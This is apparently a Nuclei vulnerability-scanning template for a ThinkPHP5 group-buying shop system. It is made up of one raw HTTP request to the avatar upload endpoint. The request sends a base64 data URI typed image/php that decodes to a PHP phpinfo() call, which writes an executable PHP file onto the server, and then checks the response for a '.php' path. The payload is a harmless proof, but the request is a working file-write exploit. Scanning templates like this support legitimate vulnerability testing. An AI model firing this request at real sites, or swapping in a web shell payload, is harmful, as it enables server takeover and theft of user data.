id: ptlssc-avatar-upload-login
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: ThinkPHP5 拼团拼购系统，支持热门商品，余额总览，红包分销，商品销售，购物车等功能，后台使用管理系统所构建；该漏洞利用需要普通用户登录权限
  reference:
    - https://github.com/wy876/POC/blob/main/%E6%8B%BC%E5%9B%A2%E9%9B%B6%E5%94%AE%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - raw:
      - |-
        POST /home/user/avatar HTTP/1.1
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br, zstd
        Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
        Cache-Control: max-age=0
        Connection: keep-alive
        Content-Length: 53
        Content-Type: application/x-www-form-urlencoded
        Cookie: PHPSESSID=kplfq401bdcmql31vr7jp2s6ul; user_id=1; uname=%25E5%2588%2598%25E6%2580%25BB
        Host: {{Hostname}}
        Origin: http://{{Hostname}}
        Referer: http://{{Hostname}}/home
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: none
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
        sec-ch-ua-mobile: ?0
        sec-ch-ua-platform: "Windows"
        sec-fetch-user: ?1

        base64=data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==
    matchers:
      - type: word
        part: body
        words:
          - '.php'
